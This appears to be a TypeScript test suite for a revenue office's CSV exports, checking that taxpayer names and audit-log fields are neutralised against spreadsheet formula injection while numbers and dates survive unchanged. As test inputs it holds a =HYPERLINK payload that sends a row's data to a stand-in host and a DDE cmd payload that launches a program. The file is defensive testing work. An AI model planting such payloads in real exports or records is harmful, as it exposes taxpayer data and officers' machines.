/**
 * A spreadsheet is a program, and these exports are written by strangers.
 *
 * `toCsv` escapes for RFC 4180 — quotes, commas, newlines — and stops there.
 * That is correct as far as the file format goes, and it is not what breaks.
 * Excel, LibreOffice and Google Sheets all treat a cell whose first character
 * is `=`, `+`, `-` or `@` as a formula, so a value that arrived as text
 * becomes code the moment an officer double-clicks the download.
 *
 * Both exports carry free text somebody outside the building supplied:
 *
 *   /government/transactions?format=csv  carries taxpayer_name — whatever an
 *   agent typed into `businessName`, which is validated for length and
 *   nothing else.
 *
 *   /government/audit?format=csv carries `reason`, `old_value` and
 *   `new_value` — the words officers type when reversing a payment or
 *   correcting a record, and the JSON around them.
 *
 * The payload that matters is not a joke about `=1+1`. `=HYPERLINK` exfiltrates
 * the row it sits next to — a taxpayer's TIN and what they paid — to any
 * address, on click, from inside the revenue office. The DDE form
 * (`=cmd|'/c ...'!A0`) is worse and still works in enough deployments to
 * assume it works in this one.
 *
 * The fix has to leave real data alone. Amounts in kobo, dates and negative
 * numbers all have to survive the export unchanged, or the CSV stops being
 * usable for the arithmetic it exists for.
 */

import './env';
import { after, before, beforeEach, describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  createGovernmentUser,
  firstLgaId,
  get,
  loginAs,
  pool,
  post,
  resetDatabase,
  startTestServer,
  stopTestServer,
  revenueItemByCode,
} from './helpers';
import { seedReferenceData } from '../db/seed';
import { seedDemoAgent } from '../db/seed-agent';
import { toCsv } from '../services/reports';

let agent: { token: string; device: string };
let officer = '';

/** The four characters a spreadsheet reads as "this cell is a program". */
const DANGEROUS = ['=', '+', '-', '@'];

before(async () => {
  await startTestServer();
});
after(async () => {
  await stopTestServer();
});

beforeEach(async () => {
  await resetDatabase();
  await seedReferenceData();
  await createGovernmentUser({ fullName: 'Export Admin', phone: '+2348000000090', role: 'admin' });
  officer = (await loginAs('+2348000000090')).accessToken;

  const demo = await seedDemoAgent();
  assert.ok(demo);
  const session = await loginAs(demo!.phone, demo!.password, demo!.deviceIdentifier);
  agent = { token: session.accessToken, device: demo!.deviceIdentifier };
});

/**
 * Is this cell inert when a spreadsheet opens it?
 *
 * The check is on the first character after any quoting the CSV format itself
 * added, because that is the character the spreadsheet looks at.
 */
function isInert(cell: string): boolean {
  const unquoted = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
  const first = unquoted.trimStart()[0];
  return first === undefined || !DANGEROUS.includes(first);
}

function cellsOf(csv: string): string[] {
  // Good enough for these assertions: split on commas outside quotes.
  return csv
    .split('\n')
    .slice(1)
    .flatMap((line) => line.match(/("([^"]|"")*"|[^,]*)/g) ?? [])
    .filter((cell) => cell !== '');
}

describe('An exported cell is data, not a program', () => {
  it('neutralises a formula that arrived as a taxpayer name', async () => {
    const auth = { token: agent.token, deviceId: agent.device };
    const hostile = '=HYPERLINK("https://example.invalid/"&A1,"Click for refund")';

    const taxpayer = await post(
      '/taxpayers',
      {
        taxpayerType: 'BUSINESS',
        businessName: hostile,
        phone: '+2348099000001',
        address: '1 Market Road, Bokkos',
        lgaId: await firstLgaId(),
        consentGiven: true,
        declarationAccepted: true,
      },
      { ...auth, idempotencyKey: 'tp-csv' },
    );
    assert.equal(taxpayer.status, 201, JSON.stringify(taxpayer.body));

    const assessment = await post(
      '/revenue/assessments',
      {
        taxpayerId: taxpayer.body.taxpayerId,
        revenueItemId: await revenueItemByCode('SHOPS-KIOSKS'),
        inputs: {},
      },
      { ...auth, idempotencyKey: 'as-csv' },
    );
    assert.equal(assessment.status, 201, JSON.stringify(assessment.body));

    const csv = await get('/government/transactions?format=csv', { token: officer });
    assert.equal(csv.status, 200);
    const body = String(csv.body);
    assert.ok(body.includes('Click for refund'), 'the name is still in the export');

    for (const cell of cellsOf(body)) {
      assert.ok(
        isInert(cell),
        `a cell opens as a formula: ${cell.slice(0, 90)}`,
      );
    }
  });

  it('neutralises a formula typed into an officer’s reason', async () => {
    // The audit log is hash-chained, so a row cannot be inserted by hand — the
    // schema refuses it, which is the control doing its job. The name of the
    // person who acted is the free text here: `actor_name` comes straight from
    // users.full_name, and government users are named by whoever creates them.
    const hostile = '@SUM(1+1)*cmd|\'/c calc\'!A0';
    const renamed = await pool.query(
      `UPDATE users SET full_name = $1
        WHERE id IN (SELECT actor_id FROM audit_logs WHERE actor_id IS NOT NULL LIMIT 1)`,
      [hostile],
    );
    assert.ok(renamed.rowCount && renamed.rowCount > 0, 'there is an audited actor to rename');

    const csv = await get('/government/audit?format=csv', { token: officer });
    assert.equal(csv.status, 200);
    const body = String(csv.body);
    assert.ok(body.includes('SUM(1+1)'), 'the actor name is still in the export');

    for (const cell of cellsOf(body)) {
      assert.ok(isInert(cell), `a cell opens as a formula: ${cell.slice(0, 90)}`);
    }
  });

  // --- controls: the export has to stay usable ---

  it('leaves numbers, negatives and dates exactly as they were', async () => {
    const csv = toCsv([
      { amount_kobo: '300000', adjustment: '-1500', rate: '-0.5', when: '2026-08-25T10:30:00.000Z' },
    ]);
    const [, values] = csv.split('\n');

    assert.equal(
      values,
      '300000,-1500,-0.5,2026-08-25T10:30:00.000Z',
      'a report nobody can add up is not a report',
    );
  });

  it('still escapes commas, quotes and newlines the way the format requires', async () => {
    const csv = toCsv([{ name: 'Bala, Danjuma', note: 'He said "no"', address: 'Line one\nLine two' }]);
    const [, values] = csv.split('\n');

    assert.ok(values!.startsWith('"Bala, Danjuma",'), values);
    assert.ok(values!.includes('"He said ""no"""'), values);
    assert.ok(csv.includes('"Line one\nLine two"'), csv);
  });

  it('still returns nothing at all for no rows', () => {
    assert.equal(toCsv([]), '');
  });
});
